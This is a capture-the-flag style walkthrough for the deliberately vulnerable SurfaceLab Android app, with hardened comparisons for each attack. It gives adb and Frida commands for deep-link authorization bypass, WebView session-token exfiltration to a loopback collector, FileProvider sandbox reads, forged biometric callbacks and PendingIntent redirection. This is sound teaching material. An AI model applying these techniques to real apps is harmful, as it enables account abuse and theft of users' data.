# SurfaceLab Cracking Walkthrough

This guide walks through the five vulnerabilities in the deliberately vulnerable SurfaceLab APK. Use it only with the included packages on an emulator or dedicated training device:

- Target: `com.example.vulnerable`
- Hardened comparison: `com.example.hardened`
- Companion attacker app: `com.example.labprobe`
- Deep-link schemes: `myapp://` and `safelab://`

Every token, account, invoice, key, and flag in this project is synthetic.

## 1 Install the lab

Enable USB debugging, start an emulator, and identify its serial:

```powershell
adb devices -l
```

Install the three APKs. Replace `emulator-5554` if your serial differs:

```powershell
adb -s emulator-5554 install -r artifacts/surfacelab-vulnerable.apk
adb -s emulator-5554 install -r artifacts/surfacelab-hardened.apk
adb -s emulator-5554 install -r artifacts/surfacelab-probe.apk
```

Launch both target apps once so they create their synthetic evidence:

```powershell
adb -s emulator-5554 shell am start -W -n com.example.vulnerable/com.example.surfacelab.MainActivity
adb -s emulator-5554 shell am start -W -n com.example.hardened/com.example.surfacelab.MainActivity
```

Launch the companion probe:

```powershell
adb -s emulator-5554 shell am start -W -n com.example.labprobe/.MainActivity
```

## 2 Crack the deep-link authorization

### Goal

Make the vulnerable app record a transfer without signing in.

### Attack

Run this command from PowerShell. Keep the full remote shell command in single quotes so PowerShell does not treat `&` as an operator:

```powershell
adb -s emulator-5554 shell 'am start -W -a android.intent.action.VIEW -d "myapp://transfer?to=Attacker&amount=42" -p com.example.vulnerable'
```

### Expected evidence

The app opens its deep-link screen and displays:

```text
FLAG{deep_link_without_auth}
Recorded 42 demo credits for Attacker without authentication.
```

The flaw is an authorization failure inside the destination activity. Android is correctly delivering a browsable link; the app wrongly treats the link as permission to perform the action.

### Hardened comparison

```powershell
adb -s emulator-5554 shell 'am start -W -a android.intent.action.VIEW -d "safelab://transfer?to=Attacker&amount=42" -p com.example.hardened'
```

Expected: `BLOCKED: external links cannot authorize a transfer.`

## 3 Exfiltrate the WebView session

### Goal

Load a page from your computer inside the vulnerable WebView and make it read the app's JavaScript session bridge.

### Attack

Start the included loopback collector:

```powershell
python scripts/collector.py
```

In another terminal, route the emulator's port 8765 back to your computer:

```powershell
adb -s emulator-5554 reverse tcp:8765 tcp:8765
```

Open the collector page through the vulnerable deep link:

```powershell
adb -s emulator-5554 shell 'am start -W -a android.intent.action.VIEW -d "myapp://webview?url=http%3A%2F%2F127.0.0.1%3A8765%2F" -p com.example.vulnerable'
```

### Expected evidence

The WebView displays the synthetic token, and the collector terminal prints a request containing:

```text
LAB_SESSION_f3a9_synthetic_only
```

The app records `FLAG{untrusted_webview_session_bridge}` in its event log. The disclosure is reproducible because any loaded origin receives the `LabSession` JavaScript bridge.

### Hardened comparison

```powershell
adb -s emulator-5554 shell 'am start -W -a android.intent.action.VIEW -d "safelab://webview?url=http%3A%2F%2F127.0.0.1%3A8765%2F" -p com.example.hardened'
```

Expected: the URL is rejected. The hardened WebView has no session bridge and does not enable JavaScript for this flow.

Clean up the port forwarding and stop the collector with Ctrl+C:

```powershell
adb -s emulator-5554 reverse --remove tcp:8765
```

## 4 Read private files through FileProvider

### Goal

Use a separate application UID to read a file from the vulnerable app's private sandbox.

### Attack

Open **SurfaceLab Probe** and make sure its target is `com.example.vulnerable`. Then:

1. Tap **Request private session**.
2. Confirm that the probe displays `session.json` and its synthetic session token.
3. Tap **Request ledger database** to copy the SQLite file into the probe's private storage.
4. Tap **Request public handout** as the positive control.

### Expected evidence

The private session request returns a URI similar to:

```text
content://com.example.vulnerable.files/root/data/data/com.example.vulnerable/files/session.json
```

The returned JSON contains:

```text
FLAG{provider_grant_crosses_app_sandbox}
```

The provider itself is not exported. The vulnerable boundary is an exported sharing broker that converts an attacker-selected path into a broad FileProvider URI and gives the caller read permission.

### Hardened comparison

Tap **Switch target**, then request the same files from `com.example.hardened`.

- Private session: blocked.
- Ledger database: blocked.
- Public handout: succeeds.

The hardened provider exposes only `cache/published/`, and its broker accepts only the public handout.

## 5 Bypass the biometric UI gate

### Goal

Forge a biometric success callback, decrypt the vault without an authenticated cryptographic operation, and observe the plaintext AES data key.

### Prerequisites

This demonstration requires Frida on your computer and a matching frida-server on a training emulator where you control instrumentation. A stock non-rooted device will not normally allow arbitrary injection.

### Attack

Start the vulnerable app with the included script:

```powershell
frida -U -f com.example.vulnerable -l scripts/frida-vault.js
```

Open **Confidential vault**, then tap **Authenticate to unlock**.

### Expected evidence

The script supplies a forged callback, the vault opens, and the app shows:

```text
FLAG{biometric_callback_is_not_crypto_auth}
```

Frida also prints the synthetic AES data key in Base64. This is an app-managed data key that was unwrapped and cached in Java memory. The Android Keystore wrapping-key bytes are not exported.

### Hardened comparison

Run the same script against the hardened package:

```powershell
frida -U -f com.example.hardened -l scripts/frida-vault.js
```

Expected: the forged callback is rejected because it contains no authenticated `CryptoObject`. A real hardened unlock requires an enrolled strong biometric and a per-use private-key operation.

## 6 Redirect the mutable PendingIntent

### Goal

Use a capability created by the vulnerable app to reach its unexported admin activity.

### Attack

In **SurfaceLab Probe**, select `com.example.vulnerable` and perform these steps:

1. Tap **Try direct admin launch**. Android should reject it with a `SecurityException` because the activity is not exported.
2. Tap **Request ticket**. The vulnerable exported broker returns a mutable PendingIntent created by the target UID.
3. Tap **Send modified ticket**. The probe supplies `AdminActivity` as the missing component.

### Expected evidence

The private admin screen opens and displays:

```text
FLAG{mutable_ticket_admin_execution}
```

It also writes `leaked_audit.txt`. On Android 10 and later, look in `Downloads/SurfaceLab/`. On Android 9, the lab uses the target's external app-specific directory.

This exact component-redirection case needs three vulnerable choices: an empty base intent, a mutable PendingIntent, and `Intent.FILL_IN_COMPONENT`. Apps targeting Android 14 or later also need the explicit unsafe implicit-intent opt-in used by this lab.

### Hardened comparison

Switch the probe to `com.example.hardened`, request a new ticket, and send the modified ticket.

Expected: the immutable explicit ticket opens `ReceiptActivity`. The private admin activity does not run, and no audit is exported.

## 7 Collect the forensic artifacts

### Goal

Acquire the lab's actual synthetic files and inspect how the vulnerable and hardened builds store them.

### Attack

Run the acquisition script against the vulnerable package:

```powershell
python scripts/collect.py --serial emulator-5554 --package com.example.vulnerable
```

If `adb` is not on your PATH:

```powershell
python scripts/collect.py --adb "C:/Users/YourName/AppData/Local/Android/Sdk/platform-tools/adb.exe" --serial emulator-5554 --package com.example.vulnerable
```

List the collected archive:

```powershell
tar -tf artifacts/evidence/com.example.vulnerable.tar
```

Extract it to a new directory:

```powershell
New-Item -ItemType Directory -Path artifacts/evidence/vulnerable-extracted -Force
tar -xf artifacts/evidence/com.example.vulnerable.tar -C artifacts/evidence/vulnerable-extracted
```

### Expected evidence

Look for:

- `files/session.json`
- `shared_prefs/session.xml`
- `files/vault.json`
- `files/events.log`
- `databases/ledger.db`
- `databases/ledger.db-wal`
- `databases/ledger.db-shm`
- the external `Documents/invoice-1042.pdf`

The JSON metadata beside the archive records the collection method, timestamp, size, and SHA-256 digest. The script uses `run-as`, which is available because these are debug training builds. It does not bypass the Android sandbox of a production app.

### Hardened comparison

```powershell
python scripts/collect.py --serial emulator-5554 --package com.example.hardened
tar -tf artifacts/evidence/com.example.hardened.tar
```

The hardened app places its sensitive fixtures under `no_backup/`, disables backup in its manifest, applies restrictive backup rules, and protects its vault and evidence screens with `FLAG_SECURE`.

Legacy `adb backup` behavior varies by Android release and manufacturer. Android 12 and later normally exclude target-31+ app data unless a development build explicitly opts in. Do not treat an empty `.ab` file as successful acquisition. Recent-app snapshots are system-owned evidence and require a compatible privileged acquisition; an ordinary probe or ADB shell cannot read `/data/system_ce/0/snapshots/`.

## 8 Run the automated checks

The smoke script repeats the cross-UID attacks and hardened comparisons:

```powershell
python scripts/smoke.py --serial emulator-5554
```

The WebView script verifies the real loopback disclosure:

```powershell
python scripts/check_webview.py --serial emulator-5554
```

Successful results are written to:

```text
artifacts/evidence/smoke.json
artifacts/evidence/webview.json
```

## 9 Reset the lab

The dashboard reset button clears observation markers only. To regenerate all fixtures, clear each package:

```powershell
adb -s emulator-5554 shell pm clear com.example.vulnerable
adb -s emulator-5554 shell pm clear com.example.hardened
adb -s emulator-5554 shell pm clear com.example.labprobe
```

Launch the apps again after clearing them. Remove any exported audit from Downloads separately.

## Flags checklist

| Lab | Flag or result |
| --- | --- |
| Deep-link transfer | `FLAG{deep_link_without_auth}` |
| WebView bridge | `FLAG{untrusted_webview_session_bridge}` in `events.log` |
| FileProvider grant | `FLAG{provider_grant_crosses_app_sandbox}` |
| Biometric callback | `FLAG{biometric_callback_is_not_crypto_auth}` |
| Mutable PendingIntent | `FLAG{mutable_ticket_admin_execution}` |
| Forensic inventory | `FLAG{forensic_artifacts_identified}` after marking the inventory observed |

For implementation details and version-specific corrections, continue with [the technical notes](docs/TECHNICAL_NOTES.md). For a presenter-oriented walkthrough, see [the full demo guide](docs/DEMO_GUIDE.md).
